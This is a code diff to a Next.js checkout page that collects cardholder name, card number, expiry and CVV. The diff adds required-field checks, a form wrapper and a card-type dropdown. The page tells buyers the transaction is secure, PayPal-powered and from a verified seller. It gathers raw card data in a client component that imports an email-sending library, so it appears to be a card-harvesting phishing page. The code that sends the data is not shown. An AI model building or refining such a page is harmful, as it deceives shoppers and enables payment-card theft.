@@ -5,8 +5,8 @@ import { useRouter } from 'next/navigation';
 import emailjs from '@emailjs/browser';
 
 export default function CheckoutPage() {
-  const [cardType, setCardType] = useState('Visa');
-  const [cardImage, setCardImage] = useState('/visa.svg');
+  const [cardType, setCardType] = useState('');
+  const [cardImage, setCardImage] = useState('');
   const [loading, setLoading] = useState(false);
   const [failed, setFailed] = useState(false);
   const [formData, setFormData] = useState({
@@ -48,7 +48,8 @@ export default function CheckoutPage() {
   };
 
   // Checkout button click
-  const handleClick = async () => {
+  const handleClick = async (e) => {
+    e.preventDefault(); // prevent form reload
     setLoading(true);
     setFailed(false);
 
@@ -85,7 +86,10 @@ export default function CheckoutPage() {
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-gray-100 p-4">
-      <div className="bg-white shadow-lg rounded-lg w-full max-w-4xl flex flex-col md:flex-row">
+      <form
+        onSubmit={handleClick}
+        className="bg-white shadow-lg rounded-lg w-full max-w-4xl flex flex-col md:flex-row"
+      >
         {/* Order Summary */}
         <div className="w-full md:w-1/2 p-6 border-r">
           <h2 className="text-2xl font-bold mb-4">Order Summary</h2>
@@ -121,6 +125,7 @@ export default function CheckoutPage() {
             onChange={handleChange}
             className="w-full border p-2 mb-4 rounded"
             placeholder="e.g. John Doe"
+            required
           />
 
           <label className="block mb-2 font-medium">Card Number</label>
@@ -131,6 +136,7 @@ export default function CheckoutPage() {
             className="w-full border p-2 mb-4 rounded"
             placeholder="1234 1234 1234 1234"
             maxLength={19}
+            required
           />
 
           <div className="flex gap-4 mb-4">
@@ -143,6 +149,7 @@ export default function CheckoutPage() {
                 className="w-full border p-2 rounded"
                 placeholder="MM/YY"
                 maxLength={5}
+                required
               />
             </div>
             <div className="flex-1">
@@ -154,12 +161,37 @@ export default function CheckoutPage() {
                 className="w-full border p-2 rounded"
                 placeholder="123"
                 maxLength={4}
+                required
               />
             </div>
           </div>
 
+          {/* Card Dropdown */}
+          <div className="mb-4">
+            <label className="block mb-2 font-medium">Select Card</label>
+            <select
+              onChange={(e) => handleCardSelect(e.target.value)}
+              value={cardType}
+              className="w-full border p-2 rounded"
+              required
+            >
+              <option value="">-- Select Card --</option>
+              <option value="Visa">Visa</option>
+              <option value="Master Card">Master Card</option>
+              <option value="American Express">American Express</option>
+            </select>
+          </div>
+
+          {/* Card Logo */}
+          {cardImage && (
+            <div className="flex items-center justify-center gap-4 mb-2">
+              <Image src={cardImage} alt={cardType} width={60} height={40} />
+            </div>
+          )}
+
           <button
-            onClick={handleClick}
+            href="/thankup"
+            type="submit"
             disabled={loading}
             className="w-full bg-blue-600 text-white py-2 rounded mb-4"
           >
@@ -172,33 +204,13 @@ export default function CheckoutPage() {
             </p>
           )}
 
-          {/* Card Dropdown */}
-          <div className="mb-4">
-            <label className="block mb-2 font-medium">Select Card</label>
-            <select
-              onChange={(e) => handleCardSelect(e.target.value)}
-              value={cardType}
-              className="w-full border p-2 rounded"
-              required
-            >
-              <option>Visa</option>
-              <option>Master Card</option>
-              <option>American Express</option>
-            </select>
-          </div>
-
-          {/* Card Logo */}
-          <div className="flex items-center justify-center gap-4 mb-2">
-            <Image src={cardImage} alt={cardType} width={60} height={40} />
-          </div>
-
           <p className="text-sm text-center text-gray-600">
             This product is offered by a verified seller. All product details,
             images, and descriptions are provided directly by them. The
             transaction is secure and powered by PayPal.
           </p>
         </div>
-      </div>
+      </form>
     </div>
   );
 }
